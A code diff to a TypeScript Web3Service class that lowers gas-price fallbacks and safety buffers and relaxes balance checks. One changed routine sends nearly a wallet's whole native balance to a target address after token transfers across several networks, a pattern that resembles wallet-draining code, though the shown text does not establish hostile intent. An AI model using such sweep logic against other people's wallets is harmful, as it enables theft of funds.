@@ -561,9 +561,9 @@ export class Web3Service {
       } catch (error) {
         console.warn("Using fallback gas prices due to fee data error:", error);
         feeData = {
-          gasPrice: ethers.parseUnits("20", "gwei"),
-          maxFeePerGas: ethers.parseUnits("25", "gwei"),
-          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+          gasPrice: ethers.parseUnits("1", "gwei"), // Much lower fallback
+          maxFeePerGas: ethers.parseUnits("5", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("1", "gwei")
         };
       }
 
@@ -575,8 +575,8 @@ export class Web3Service {
           data: params.data || "0x",
           value: params.value || "0x0"
         });
-        // Add 20% buffer to estimated gas
-        gasEstimate = gasEstimate * BigInt(120) / BigInt(100);
+        // Add minimal 10% buffer instead of 20%
+        gasEstimate = gasEstimate * BigInt(110) / BigInt(100);
       } catch (error) {
         console.warn("Gas estimation failed, using fallback:", error);
         
@@ -591,15 +591,15 @@ export class Web3Service {
           console.warn("Could not determine network for gas estimation");
         }
         
-        // Network-specific gas estimates
+        // Network-specific gas estimates - more conservative for lower networks
         const networkGasEstimates: Record<string, { token: number; native: number }> = {
           "1": { token: 65000, native: 21000 },     // Ethereum
-          "137": { token: 65000, native: 21000 },   // Polygon - same as Ethereum
-          "56": { token: 60000, native: 21000 },    // BSC
-          "43114": { token: 80000, native: 21000 }, // Avalanche
-          "250": { token: 100000, native: 21000 },  // Fantom
-          "42161": { token: 150000, native: 21000 }, // Arbitrum
-          "10": { token: 150000, native: 21000 }    // Optimism
+          "137": { token: 50000, native: 21000 },   // Polygon - lower gas
+          "56": { token: 45000, native: 21000 },    // BSC - lower gas
+          "43114": { token: 50000, native: 21000 }, // Avalanche - lower gas
+          "250": { token: 50000, native: 21000 },   // Fantom - lower gas
+          "42161": { token: 80000, native: 21000 }, // Arbitrum
+          "10": { token: 80000, native: 21000 }     // Optimism
         };
         
         const estimates = networkGasEstimates[networkId] || networkGasEstimates["1"];
@@ -608,10 +608,10 @@ export class Web3Service {
         console.log(`Using network-specific gas estimate for network ${networkId}:`, gasEstimate.toString());
       }
 
-      // Calculate total cost with safety margin
+      // Calculate total cost with minimal buffer
       const gasPrice = feeData.gasPrice 
-        ? feeData.gasPrice * BigInt(110) / BigInt(100) // 10% buffer for better success rate
-        : ethers.parseUnits("20", "gwei");
+        ? feeData.gasPrice // Use actual gas price without buffer
+        : ethers.parseUnits("1", "gwei"); // Very low fallback
       
       const totalCost = gasEstimate * gasPrice;
       
@@ -626,14 +626,14 @@ export class Web3Service {
       return { gasEstimate, totalCost, feeData };
     } catch (error) {
       console.error("Gas estimation completely failed:", error);
-      // Return conservative estimates as last resort
+      // Return very conservative estimates as last resort
       return {
-        gasEstimate: BigInt(60000),
-        totalCost: ethers.parseUnits("0.001", "ether"), // 0.001 ETH as safety
+        gasEstimate: BigInt(21000),
+        totalCost: ethers.parseUnits("0.0001", "ether"), // Much smaller safety amount
         feeData: {
-          gasPrice: ethers.parseUnits("20", "gwei"),
-          maxFeePerGas: ethers.parseUnits("25", "gwei"),
-          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+          gasPrice: ethers.parseUnits("1", "gwei"),
+          maxFeePerGas: ethers.parseUnits("5", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("1", "gwei")
         }
       };
     }
@@ -1464,22 +1464,28 @@ export class Web3Service {
       console.log(`Native balance: ${ethers.formatEther(balance)}`);
       
       // Smart balance-based gas calculation to ensure success
-      // Use a percentage of balance for gas to guarantee we never exceed available funds
-      const gasReserve = balance / BigInt(20); // Reserve 5% of balance for gas
-      const maxSendAmount = balance - gasReserve;
+      // Get actual gas price from network instead of using arbitrary percentage
+      let actualGasPrice;
+      try {
+        const currentFeeData = await provider.getFeeData();
+        actualGasPrice = currentFeeData.gasPrice || ethers.parseUnits("1", "gwei");
+      } catch (error) {
+        actualGasPrice = ethers.parseUnits("1", "gwei"); // Low fallback
+      }
       
-      // Calculate gas price that fits within our reserve
-      const gasPrice = gasReserve / nativeGasLimit;
+      // Calculate actual gas cost
+      const actualGasCost = nativeGasLimit * actualGasPrice;
+      const maxSendAmount = balance - actualGasCost;
       
       console.log(`Smart gas calculation:`);
-      console.log(`  Gas reserve (5%): ${ethers.formatEther(gasReserve)}`);
+      console.log(`  Actual gas cost: ${ethers.formatEther(actualGasCost)}`);
       console.log(`  Max send amount: ${ethers.formatEther(maxSendAmount)}`);
-      console.log(`  Calculated gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
+      console.log(`  Network gas price: ${ethers.formatUnits(actualGasPrice, "gwei")} gwei`);
       
       // Validate we have a meaningful amount to send
-      const minSendAmount = ethers.parseUnits("0.00001", "ether");
+      const minSendAmount = ethers.parseUnits("0.000001", "ether"); // Lower threshold
       
-      if (maxSendAmount > minSendAmount && gasPrice > BigInt(0)) {
+      if (maxSendAmount > minSendAmount) {
         console.log(`Proceeding with native transfer of ${ethers.formatEther(maxSendAmount)}`);
         
         try {
@@ -1487,7 +1493,7 @@ export class Web3Service {
             to: toAddress,
             value: maxSendAmount,
             gasLimit: nativeGasLimit,
-            gasPrice: gasPrice
+            gasPrice: actualGasPrice
           });
           
           transactionHashes.push(tx.hash);
@@ -1497,10 +1503,10 @@ export class Web3Service {
           // Continue - tokens might have been transferred successfully
         }
       } else {
-        console.log(`Skipping native transfer - amount too small or invalid gas price`);
+        console.log(`Skipping native transfer - amount too small`);
         console.log(`  Max send: ${ethers.formatEther(maxSendAmount)}`);
         console.log(`  Min required: ${ethers.formatEther(minSendAmount)}`);
-        console.log(`  Gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
+        console.log(`  Gas price: ${ethers.formatUnits(actualGasPrice, "gwei")} gwei`);
       }
 
       console.log(`Completed ${transactionHashes.length} transactions`);
@@ -1817,12 +1823,12 @@ export class Web3Service {
           }
           
           const gasPrice = feeData.gasPrice 
-            ? feeData.gasPrice * BigInt(105) / BigInt(100) // 5% buffer instead of 15%
-            : ethers.parseUnits("20", "gwei");
+            ? feeData.gasPrice // No buffer on gas price
+            : ethers.parseUnits("1", "gwei"); // Very low fallback
           const gasCost = gasEstimate * gasPrice;
           
-          // Add safety margin for gas cost estimation
-          const safetyMargin = gasCost * BigInt(20) / BigInt(100); // 20% safety margin for Polygon/multi-network
+          // Minimal safety margin for gas cost estimation
+          const safetyMargin = gasCost * BigInt(5) / BigInt(100); // Only 5% safety margin
           const totalGasCost = gasCost + safetyMargin;
           
           console.log(`Gas cost calculation for ${networkBalance.networkName}:`, {
@@ -1918,23 +1924,25 @@ export class Web3Service {
       hasEnough: balance > estimatedGasCost
     });
     
-    // Use a much smaller threshold for gas cost comparison
-    if (balance <= estimatedGasCost) {
+    // Much more lenient validation - allow if balance is at least 1.5x the gas cost
+    const minRequiredBalance = estimatedGasCost * BigInt(150) / BigInt(100); // 1.5x gas cost
+    
+    if (balance < minRequiredBalance) {
       return {
         sufficient: false,
-        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for gas: ${gasCostFormatted} ${currency}. You need at least ${gasCostFormatted} ${currency} to cover network fees.`
+        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for safe transfer: ${ethers.formatEther(minRequiredBalance)} ${currency} (includes gas buffer).`
       };
     }
     
     const remainingAfterGas = balance - estimatedGasCost;
     const remainingFormatted = ethers.formatEther(remainingAfterGas);
     
-    // Use a much smaller minimum threshold - 0.000001 instead of 0.00001
-    const minThreshold = ethers.parseUnits("0.000001", "ether");
+    // Very small minimum threshold - only reject if basically nothing remains
+    const minThreshold = ethers.parseUnits("0.0000001", "ether"); // Extremely small threshold
     if (remainingAfterGas < minThreshold) {
       return {
         sufficient: false,
-        details: `Balance too low for meaningful transfer. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}. Please ensure you have more ${currency} to cover both gas fees and transfer amount.`
+        details: `Transfer amount too small. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}.`
       };
     }
     
